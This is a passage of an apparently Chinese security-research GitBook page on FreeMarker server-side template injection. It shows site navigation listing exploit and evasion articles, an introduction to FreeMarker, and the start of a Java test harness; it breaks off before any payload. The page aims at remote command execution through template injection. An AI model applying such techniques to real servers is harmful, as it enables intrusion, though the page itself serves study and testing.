@@ -1,0 +1,1478 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>FreeMarker模板注入实例 · R4ph4e1 的知识库</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="R4ph4e1">
+        
+        
+    
+    <link rel="stylesheet" href="../../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search-pro-fixed/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-flexible-alerts/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-prism/prism-tomorrow.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-auto-scroll-table/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-theme-d4t/style.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="header-inner">
+        <!-- LOGO -->
+        <a href="/"><div class="logo"></div></a>
+        <span class="title"></span>
+
+        <!-- Search -->
+        
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+
+        <!-- Nav -->
+        <ul class="header-nav">
+            
+        </ul>
+    </div>
+
+    <div class="book-summary">
+        <div class="sidebar-nav-space"></div>
+        
+        
+        <nav role="navigation">
+            
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        <li class="header">Markdown</li>
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../../">
+            
+                <a href="../../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" >
+            
+                <span>
+            
+                    
+                    PWN练习记录
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" >
+            
+                <span>
+            
+                    
+                    Pwn3绕过Canary.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../../PWN练习记录/Pwn3绕过Canary.html">
+            
+                <a href="../../PWN练习记录/Pwn3绕过Canary.html">
+            
+                    
+                    Pwn3绕过Canary
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" >
+            
+                <span>
+            
+                    
+                    Pwn基础溢出练习.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../../PWN练习记录/Pwn基础溢出练习.html">
+            
+                <a href="../../PWN练习记录/Pwn基础溢出练习.html">
+            
+                    
+                    Pwn基础溢出练习
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    实战记录
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" >
+            
+                <span>
+            
+                    
+                    SSTI实战
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1" >
+            
+                <span>
+            
+                    
+                    FreeMarker模板注入实例.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.3.1.2" data-path="FreeMarker模板注入实例.html">
+            
+                <a href="FreeMarker模板注入实例.html">
+            
+                    
+                    FreeMarker模板注入实例
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" >
+            
+                <span>
+            
+                    
+                    Shiro实战
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.1" >
+            
+                <span>
+            
+                    
+                    JEECMS的Shiro C3P0链.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.2" data-path="../Shiro实战/JEECMS的Shiro-C3P0链.html">
+            
+                <a href="../Shiro实战/JEECMS的Shiro-C3P0链.html">
+            
+                    
+                    JEECMS的Shiro C3P0链
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.3" >
+            
+                <span>
+            
+                    
+                    再战JEECMS Shiro.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.4" data-path="../Shiro实战/再战JEECMS-shiro的小技巧.html">
+            
+                <a href="../Shiro实战/再战JEECMS-shiro的小技巧.html">
+            
+                    
+                    再战JEECMS Shiro的小技巧
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.5" >
+            
+                <span>
+            
+                    
+                    记一次Shiro爆杀阿里云WAF.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.6" data-path="../Shiro实战/记一次shiro爆杀阿里云WAF.html">
+            
+                <a href="../Shiro实战/记一次shiro爆杀阿里云WAF.html">
+            
+                    
+                    记一次Shiro爆杀阿里云WAF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" >
+            
+                <span>
+            
+                    
+                    表达式注入实战
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.1" >
+            
+                <span>
+            
+                    
+                    OGNL注入实战.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.2" data-path="../表达式注入实战/OGNL注入实战.html">
+            
+                <a href="../表达式注入实战/OGNL注入实战.html">
+            
+                    
+                    OGNL注入实战
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.3" >
+            
+                <span>
+            
+                    
+                    记一次SPEL表达式注入.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.4" data-path="../表达式注入实战/记一次SPEL表达式注入.html">
+            
+                <a href="../表达式注入实战/记一次SPEL表达式注入.html">
+            
+                    
+                    记一次SPEL表达式注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" >
+            
+                <span>
+            
+                    
+                    工程化
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" >
+            
+                <span>
+            
+                    
+                    免杀相关
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1.1" >
+            
+                <span>
+            
+                    
+                    ShellcodeLoader自动生成器改造.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.2" data-path="../../工程化/免杀相关/ShellcodeLoader自动生成器改造.html">
+            
+                <a href="../../工程化/免杀相关/ShellcodeLoader自动生成器改造.html">
+            
+                    
+                    ShellcodeLoader自动生成器改造
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.3" >
+            
+                <span>
+            
+                    
+                    Shellcode加载器免杀调试.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.4" data-path="../../工程化/免杀相关/Shellcode加载器免杀调试.html">
+            
+                <a href="../../工程化/免杀相关/Shellcode加载器免杀调试.html">
+            
+                    
+                    Shellcode加载器免杀调试
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" >
+            
+                <span>
+            
+                    
+                    插件编写
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1" >
+            
+                <span>
+            
+                    
+                    Burp插件——记一次修复Bug之旅
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1.1" >
+            
+                <span>
+            
+                    
+                    Burp插件——记一次修复Bug之旅.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2" data-path="../../工程化/插件编写/burp插件——记一次修复Bug之旅/burp插件——记一次修复Bug之旅.html">
+            
+                <a href="../../工程化/插件编写/burp插件——记一次修复Bug之旅/burp插件——记一次修复Bug之旅.html">
+            
+                    
+                    Burp插件——记一次修复Bug之旅
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" >
+            
+                <span>
+            
+                    
+                    漏洞研究
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" >
+            
+                <span>
+            
+                    
+                    JAVA安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1.1" >
+            
+                <span>
+            
+                    
+                    Fastjson
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1.1.1" >
+            
+                <span>
+            
+                    
+                    Fastjson 1267反序列化复现.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.1.1.2" data-path="../../漏洞研究/JAVA安全/Fastjson/fastjson_1267反序列化复现.html">
+            
+                <a href="../../漏洞研究/JAVA安全/Fastjson/fastjson_1267反序列化复现.html">
+            
+                    
+                    Fastjson 1267反序列化复现
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.1.2" >
+            
+                <span>
+            
+                    
+                    Log4j
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1.2.1" >
+            
+                <span>
+            
+                    
+                    Log4j漏洞分析.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.1.2.2" data-path="../../漏洞研究/JAVA安全/Log4j/log4j漏洞分析.html">
+            
+                <a href="../../漏洞研究/JAVA安全/Log4j/log4j漏洞分析.html">
+            
+                    
+                    Log4j漏洞分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" >
+            
+                <span>
+            
+                    
+                    PHP安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.2.1" >
+            
+                <span>
+            
+                    
+                    TP框架
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.2.1.1" >
+            
+                <span>
+            
+                    
+                    Tp6多语言模块RCE漏洞利用分析.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2.1.2" data-path="../../漏洞研究/PHP安全/TP框架/tp6多语言模块RCE漏洞利用分析.html">
+            
+                <a href="../../漏洞研究/PHP安全/TP框架/tp6多语言模块RCE漏洞利用分析.html">
+            
+                    
+                    Tp6多语言模块RCE漏洞利用分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2.1.3" >
+            
+                <span>
+            
+                    
+                    浅谈ApacheNginx与PHP CGI之间的关系.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2.1.4" data-path="../../漏洞研究/PHP安全/TP框架/浅谈ApacheNginx与PHP-CGI之间的关系.html">
+            
+                <a href="../../漏洞研究/PHP安全/TP框架/浅谈ApacheNginx与PHP-CGI之间的关系.html">
+            
+                    
+                    浅谈ApacheNginx与PHP CGI之间的关系
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" >
+            
+                <span>
+            
+                    
+                    移动安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" >
+            
+                <span>
+            
+                    
+                    Android 10 分区的一些知识.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" data-path="../../移动安全/Android_10_分区的一些知识.html">
+            
+                <a href="../../移动安全/Android_10_分区的一些知识.html">
+            
+                    
+                    Android 10 分区的一些知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" >
+            
+                <span>
+            
+                    
+                    Android 10 简明刷机与救砖教程.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.4" data-path="../../移动安全/Android_10_简明刷机与救砖教程.html">
+            
+                <a href="../../移动安全/Android_10_简明刷机与救砖教程.html">
+            
+                    
+                    Android 10 简明刷机与救砖教程
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.5" >
+            
+                <span>
+            
+                    
+                    安卓入门.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.6" data-path="../../移动安全/安卓入门.html">
+            
+                <a href="../../移动安全/安卓入门.html">
+            
+                    
+                    安卓入门
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" >
+            
+                <span>
+            
+                    
+                    翻译文章
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../../翻译文章/SSRF_by_SNI_proxy.html">
+            
+                <a href="../../翻译文章/SSRF_by_SNI_proxy.html">
+            
+                    
+                    SSRF By SNI Proxy
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" >
+            
+                <span>
+            
+                    
+                    静态分析
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" >
+            
+                <span>
+            
+                    
+                    CodeQL使用篇.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="../../静态分析/codeQL使用篇.html">
+            
+                <a href="../../静态分析/codeQL使用篇.html">
+            
+                    
+                    CodeQL使用篇
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" >
+            
+                <span>
+            
+                    
+                    CodeQL入门篇.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.4" >
+            
+                <span>
+            
+                    
+                    CodeQL语法篇.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.5" data-path="../../静态分析/codeQL语法篇.html">
+            
+                <a href="../../静态分析/codeQL语法篇.html">
+            
+                    
+                    CodeQL语法篇
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.6" >
+            
+                <span>
+            
+                    
+                    南大软件分析01.Assets
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.7" data-path="../../静态分析/南大软件分析01.html">
+            
+                <a href="../../静态分析/南大软件分析01.html">
+            
+                    
+                    南大软件分析01
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+        </nav>
+        
+        
+    </div>
+
+    <!-- Content nav -->
+    <div class="book-anchor">
+        <div class="book-anchor-title">ON THIS PAGE</div>
+        <div class="book-anchor-body">
+
+        </div>
+    </div>
+
+    <div class="book-body">
+        
+        <div class="body-inner">
+            
+            
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../.." >FreeMarker模板注入实例</a>
+    </h1>
+</div>
+
+
+
+
+            <div class="page-wrapper" tabindex="-1" role="main">
+                <div class="page-inner">
+                    
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                    <section class="normal markdown-section">
+                        
+                        <h1 id="freemarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;">FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;</h1>
+<hr>
+<h3 id="&#x4E00;&#x3001;&#x524D;&#x8A00;">&#x4E00;&#x3001;&#x524D;&#x8A00;</h3>
+<p><strong>&#x5C3D;&#x7BA1;JAVA&#x6A21;&#x677F;&#x5F15;&#x64CE;&#x4EEC;&#x5927;&#x90FD;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x5DEE;&#x4E0D;&#x591A;&#x7684;&#x529F;&#x80FD;&#x6548;&#x679C;&#xFF0C;&#x4F46;&#x7ECF;&#x8FC7;&#x591A;&#x6B21;&#x6D4B;&#x8BD5;&#x548C;&#x7ECF;&#x9A8C;&#x8FDB;&#x884C;&#x5224;&#x65AD;&#xFF0C;FreeMarker&#x591A;&#x7528;&#x4E8E;&#x90AE;&#x4EF6;&#x7B49;HTML&#x6A21;&#x677F;&#xFF0C;Thymeleaf&#x591A;&#x7528;&#x4E8E;&#x66F4;&#x7CBE;&#x81F4;&#x7684;&#x524D;&#x7AEF;&#x9875;&#x9762;&#x6570;&#x636E;&#x5C55;&#x793A;&#x3002;</strong></p>
+<hr>
+<h3 id="&#x4E8C;&#x3001;freemarker&#x73AF;&#x5883;&#x642D;&#x5EFA;">&#x4E8C;&#x3001;FreeMarker&#x73AF;&#x5883;&#x642D;&#x5EFA;</h3>
+<p><em>&#x4E0B;&#x9762;&#x5F88;&#x5927;&#x4E00;&#x90E8;&#x5206;&#x53C2;&#x8003;&#x6765;&#x81EA;<a href="https://www.cnblogs.com/Eleven-Liu/" target="_blank">Eleven</a>&#x5E08;&#x5085;&#x7684;&#x535A;&#x5BA2;&#x6587;&#x7AE0;&#xFF0C;<a href="https://www.cnblogs.com/Eleven-Liu/p/12747908.html" target="_blank">FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x73B0;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x6267;&#x884C;</a>&#xFF0C;&#x9488;&#x5BF9;&#x5B9E;&#x9645;&#x6D4B;&#x8BD5;&#x60C5;&#x51B5;&#x4F5C;&#x4E86;&#x4E00;&#x4E9B;&#x6539;&#x52A8;&#x548C;&#x4E30;&#x5BCC;payload&#x5F62;&#x5F0F;&#x5E76;&#x586B;&#x4E86;&#x4E00;&#x4E9B;&#x6D4B;&#x8BD5;&#x8FC7;&#x7A0B;&#x4E2D;&#x9047;&#x5230;&#x7684;&#x5751;&#x3002;</em></p>
+<p><strong>&#x4EC0;&#x4E48;&#x662F; FreeMarker?</strong></p>
+<p>FreeMarker &#x662F;&#x4E00;&#x6B3E; &#x6A21;&#x677F;&#x5F15;&#x64CE;&#xFF1A;&#x5373;&#x4E00;&#x79CD;&#x57FA;&#x4E8E;&#x6A21;&#x677F;&#x548C;&#x8981;&#x6539;&#x53D8;&#x7684;&#x6570;&#x636E;&#xFF0C; &#x5E76;&#x7528;&#x6765;&#x751F;&#x6210;&#x8F93;&#x51FA;&#x6587;&#x672C;(HTML&#x7F51;&#x9875;&#xFF0C;&#x7535;&#x5B50;&#x90AE;&#x4EF6;&#xFF0C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x6E90;&#x4EE3;&#x7801;&#x7B49;)&#x7684;&#x901A;&#x7528;&#x5DE5;&#x5177;&#x3002; &#x5B83;&#x4E0D;&#x662F;&#x9762;&#x5411;&#x6700;&#x7EC8;&#x7528;&#x6237;&#x7684;&#xFF0C;&#x800C;&#x662F;&#x4E00;&#x4E2A;Java&#x7C7B;&#x5E93;&#xFF0C;&#x662F;&#x4E00;&#x6B3E;&#x7A0B;&#x5E8F;&#x5458;&#x53EF;&#x4EE5;&#x5D4C;&#x5165;&#x4ED6;&#x4EEC;&#x6240;&#x5F00;&#x53D1;&#x4EA7;&#x54C1;&#x7684;&#x7EC4;&#x4EF6;&#x3002;</p>
+<p>&#x6A21;&#x677F;&#x7F16;&#x5199;&#x4E3A;FreeMarker Template Language (FTL)&#x3002;&#x5B83;&#x662F;&#x7B80;&#x5355;&#x7684;&#xFF0C;&#x4E13;&#x7528;&#x7684;&#x8BED;&#x8A00;&#xFF0C; <em>&#x4E0D;&#x662F;</em> &#x50CF;PHP&#x90A3;&#x6837;&#x6210;&#x719F;&#x7684;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x3002; &#x90A3;&#x5C31;&#x610F;&#x5473;&#x7740;&#x8981;&#x51C6;&#x5907;&#x6570;&#x636E;&#x5728;&#x771F;&#x5B9E;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x4E2D;&#x6765;&#x663E;&#x793A;&#xFF0C;&#x6BD4;&#x5982;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x548C;&#x4E1A;&#x52A1;&#x8FD0;&#x7B97;&#xFF0C; &#x4E4B;&#x540E;&#x6A21;&#x677F;&#x663E;&#x793A;&#x5DF2;&#x7ECF;&#x51C6;&#x5907;&#x597D;&#x7684;&#x6570;&#x636E;&#x3002;&#x5728;&#x6A21;&#x677F;&#x4E2D;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x4E13;&#x6CE8;&#x4E8E;&#x5982;&#x4F55;&#x5C55;&#x73B0;&#x6570;&#x636E;&#xFF0C; &#x800C;&#x5728;&#x6A21;&#x677F;&#x4E4B;&#x5916;&#x53EF;&#x4EE5;&#x4E13;&#x6CE8;&#x4E8E;&#x8981;&#x5C55;&#x793A;&#x4EC0;&#x4E48;&#x6570;&#x636E;&#x3002;</p>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/1201375-20200421205350706-1497489585.png" data-lightbox="22eedfb4-e140-4164-a7b1-a96fedae8983" data-title="img"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/1201375-20200421205350706-1497489585.png" alt="img"></a></p>
+<p> &#x5E38;&#x7528;&#x7684;&#x51E0;&#x79CD;&#x7C7B;&#x578B;&#xFF1A;</p>
+<p><strong>&#x6587;&#x672C;&#xFF1A;</strong>&#x5305;&#x62EC;HTML&#x6807;&#x7B7E;&#x4E0E;&#x9759;&#x6001;&#x6587;&#x672C;&#x7B49;&#x9759;&#x6001;&#x5185;&#x5BB9;&#xFF0C;&#x4F1A;&#x539F;&#x6837;&#x8F93;&#x51FA;&#xFF1B;</p>
+<p><strong>&#x63D2;&#x503C;&#xFF1A;</strong>&#x8FD9;&#x90E8;&#x5206;&#x7684;&#x8F93;&#x51FA;&#x4F1A;&#x88AB;&#x8BA1;&#x7B97;&#x7684;&#x6570;&#x636E;&#x6765;&#x66FF;&#x6362;&#xFF0C;&#x4F7F;&#x7528;${}&#x8FD9;&#x79CD;&#x8BED;&#x6CD5;&#xFF1B;</p>
+<p><strong>&#x6807;&#x7B7E;&#xFF1A;</strong>&#x7ED9;FreeMarker&#x7684;&#x6307;&#x793A;&#xFF0C;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x4E0E;&#x6307;&#x4EE4;&#x7B49;&#x540C;&#xFF0C;&#x4E0D;&#x4F1A;&#x6253;&#x5370;&#x5728;&#x5185;&#x5BB9;&#x4E2D;&#xFF0C;&#x6BD4;&#x5982;&lt;#assign name=&apos;bob&apos;&gt;&#xFF1B;</p>
+<p><strong>&#x6CE8;&#x91CA;&#xFF1A;</strong>&#x7531;&lt;#&#x2013;&#x548C;&#x2013;&gt;&#x8868;&#x793A;&#xFF0C;&#x4E0D;&#x4F1A;&#x88AB;freemarker&#x5904;&#x7406;</p>
+<p>&#x6839;&#x636E;FreeMarker&#x5B98;&#x65B9;&#x5F00;&#x53D1;&#x6587;&#x6863;&#xFF0C;&#x642D;&#x5EFA;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x6D4B;&#x8BD5;&#x73AF;&#x5883;&#xFF0C;&#x7531;&#x4E8E;&#x6211;&#x4EEC;&#x9996;&#x8981;&#x6A21;&#x677F;&#x5C31;&#x662F;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x6240;&#x4EE5;&#x76F4;&#x63A5;&#x8BFB;&#x53D6;test.ftl&#x91CC;&#x7684;FreeMarker&#x8BED;&#x53E5;&#x8FDB;&#x884C;FreeMarker&#x5F15;&#x64CE;&#x89E3;&#x6790;&#xFF0C;&#x7ED3;&#x679C;&#x8F93;&#x51FA;&#x5230;&#x63A7;&#x5236;&#x53F0;&#x5373;&#x53EF;&#xFF0C;&#x6CA1;&#x6709;&#x53BB;&#x53C2;&#x8003;<a href="https://www.cnblogs.com/Eleven-Liu/" target="_blank">Eleven</a>&#x5E08;&#x5085;&#x7684;&#x65B9;&#x6CD5;&#x3002;</p>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220210135946799.png" data-lightbox="8298092b-5221-4c39-bfbd-9a49ec1e8988" data-title="image-20220210135946799"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220210135946799.png" alt="image-20220210135946799"></a></p>
+<p>freeMark.java</p>
+<pre class="language-"><code class="lang-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">freemarker<span class="token punctuation">.</span>template<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> freeMark <span class="token punctuation">{</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
+
+        <span class="token comment">/* ------------------------------------------------------------------------ */</span>
+        <span class="token comment">/* You should do this ONLY ONCE in the whole application life-cycle:        */</span>
+
+        <span class="token comment">/* Create and adjust the configuration singleton */</span>
+        <span class="token class-name">Configuration</span> cfg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token comment">/*Configuration.VERSION_2_3_9*/</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cfg<span class="token punctuation">.</span><span class="token function">setDirectoryForTemplateLoading</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">&quot;E:\\winbak\\tools\\08_Audit\\freemarker_test\\src\\main\\java&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cfg<span class="token punctuation">.</span><span class="token function">setDefaultEncoding</span><span class="token punctuation">(</span><span class="token string">&quot;UTF-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cfg<span class="token punctuation">.</span><span class="token function">setTemplateExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">TemplateExceptionHandler</span><span class="token punctuation">.</span><span class="token constant">RETHROW_HANDLER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/* ------------------------------------------------------------------------ */</span>
+        <span class="token comment">/* You usually do these for MULTIPLE TIMES in the application life-cycle:   */</span>
+        <span class="token comment">//Configuration cfg = new Configuration();</span>
+        <span class="token comment">/* Create a data-model */</span>
